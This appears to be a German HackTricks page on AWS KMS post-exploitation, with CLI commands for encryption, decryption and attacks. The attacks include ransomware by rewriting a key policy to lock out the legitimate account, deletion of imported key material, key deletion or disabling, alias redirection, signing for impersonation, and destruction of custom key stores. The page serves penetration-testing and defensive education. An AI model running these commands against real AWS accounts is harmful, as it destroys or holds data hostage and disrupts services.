# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

Für weitere Informationen siehe:

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### Verschlüsseln/Entschlüsseln von Informationen

`fileb://` and `file://` are URI schemes used in AWS CLI commands to specify the path to local files:

- `fileb://:` Liest die Datei im Binärmodus, wird häufig für Nicht-Text-Dateien verwendet.
- `file://:` Liest die Datei im Textmodus, typischerweise verwendet für reine Textdateien, Skripte oder JSON, das keine spezielle Kodierung benötigt.

> [!TIP]
> Beachte, dass, wenn du Daten innerhalb einer Datei entschlüsseln willst, die Datei die binären Daten enthalten muss, nicht base64-kodierte Daten. (fileb://)

- Verwendung eines **symmetrischen** Schlüssels
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Verwendung eines **asymmetrischen** Schlüssels:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

Ein Angreifer mit privilegiertem Zugriff auf KMS könnte die KMS-Policy von Schlüsseln modifizieren und seinem Account Zugriff darauf gewähren, wodurch der dem legitimen Konto gewährte Zugriff entfernt wird.

Die Nutzer des legitimen Kontos können dann auf keine Informationen von Diensten zugreifen, die mit diesen Schlüsseln verschlüsselt wurden, wodurch ein einfacher, aber effektiver Ransomware-Angriff auf das Konto entsteht.

> [!WARNING]
> Beachte, dass **AWS managed keys aren't affected**; betroffen sind nur **Customer managed keys**.

> Beachte außerdem, dass der Parameter **`--bypass-policy-lockout-safety-check`** verwendet werden muss (das Fehlen dieser Option in der Web-Konsole macht diesen Angriff nur über die CLI möglich).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Beachte, dass wenn du diese Richtlinie änderst und nur einem externen Konto Zugriff gewährst, und dann von diesem externen Konto aus versuchst, eine neue Richtlinie zu setzen, um **den Zugriff an das ursprüngliche Konto zurückzugeben, wirst du nicht in der Lage sein, da die Put Polocy action nicht von einem cross account ausgeführt werden kann**.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

Es gibt eine andere Möglichkeit, eine globale KMS Ransomware durchzuführen, die die folgenden Schritte umfasst:

- Erstelle einen neuen **key with a key material**, das vom Angreifer importiert wurde
- **Re-encrypt older data** des Opfers, die mit der vorherigen Version verschlüsselt wurden, mit der neuen
- **Delete the KMS key**
- Nun könnte nur noch der Angreifer, der das original key material besitzt, die verschlüsselten Daten decrypten

### Delete Keys via kms:DeleteImportedKeyMaterial

Mit der Berechtigung `kms:DeleteImportedKeyMaterial` kann ein Akteur das importierte key material von CMKs mit `Origin=EXTERNAL` (CMKs, die ihr key material importiert haben) löschen, wodurch diese nicht mehr in der Lage wären, Daten zu decrypten. Diese Aktion ist destruktiv und irreversibel, es sei denn, kompatibles Material wird erneut importiert. Dadurch kann ein Angreifer effektiv einen ransomware-ähnlichen Datenverlust verursachen, indem er verschlüsselte Informationen dauerhaft unzugänglich macht.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Schlüssel zerstören

Durch das Zerstören von Schlüsseln ist es möglich, einen DoS durchzuführen.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> Beachte, dass AWS nun **verhindert, dass die vorherigen Aktionen aus einem anderen Account ausgeführt werden:**

### Alias ändern oder löschen
Dieser Angriff löscht oder leitet AWS KMS-Aliase um, wodurch die Schlüsselauflösung unterbrochen wird und sofortige Ausfälle in allen Diensten verursacht werden, die diese Aliase verwenden, was zu einem denial-of-service führt. Mit Berechtigungen wie `kms:DeleteAlias` oder `kms:UpdateAlias` kann ein Angreifer Aliase entfernen oder umleiten und kryptographische Operationen stören (z. B. encrypt, describe). Jeder Dienst, der den Alias statt der key ID referenziert, kann fehlschlagen, bis der Alias wiederhergestellt oder korrekt neu zugewiesen ist.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Abbrechen der Schlüssel-Löschung
Mit Berechtigungen wie `kms:CancelKeyDeletion` und `kms:EnableKey` kann ein Angreifer die geplante Löschung eines AWS KMS customer master key abbrechen und ihn später wieder aktivieren. Dadurch wird der Schlüssel (anfangs im deaktivierten Zustand) wiederhergestellt und kann wieder zuvor geschützte Daten entschlüsseln, wodurch exfiltration ermöglicht wird.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Schlüssel deaktivieren
Mit der Berechtigung kms:DisableKey kann ein Akteur einen AWS KMS customer master key deaktivieren, sodass er nicht mehr für Verschlüsselung oder Entschlüsselung verwendet werden kann. Dies unterbricht den Zugriff für alle Dienste, die von diesem CMK abhängen, und kann sofortige Störungen oder eine Dienstverweigerung verursachen, bis der Schlüssel wieder aktiviert wird.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Gemeinsames Secret ableiten
Mit der Berechtigung `kms:DeriveSharedSecret` kann ein Akteur einen bei KMS verwahrten privaten Schlüssel zusammen mit einem vom Benutzer bereitgestellten öffentlichen Schlüssel verwenden, um ein ECDH Shared Secret zu berechnen.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
Mit der Berechtigung `kms:Sign` kann ein Akteur einen in KMS gespeicherten CMK verwenden, um Daten kryptografisch zu signieren, ohne den privaten Schlüssel preiszugeben, und gültige Signaturen zu erzeugen, die impersonation ermöglichen oder bösartige Aktionen autorisieren können.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS with Custom Key Stores
Mit Berechtigungen wie `kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore` oder `kms:UpdateCustomKeyStore` kann ein Akteur ein AWS KMS Custom Key Store (CKS) ändern, trennen oder löschen, wodurch dessen Master-Schlüssel unbrauchbar werden. Das unterbricht Verschlüsselungs-, Entschlüsselungs- und Signiervorgänge für alle Dienste, die auf diesen Schlüsseln basieren, und kann eine sofortige denial-of-service verursachen. Daher ist es kritisch, diese Berechtigungen einzuschränken und zu überwachen.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
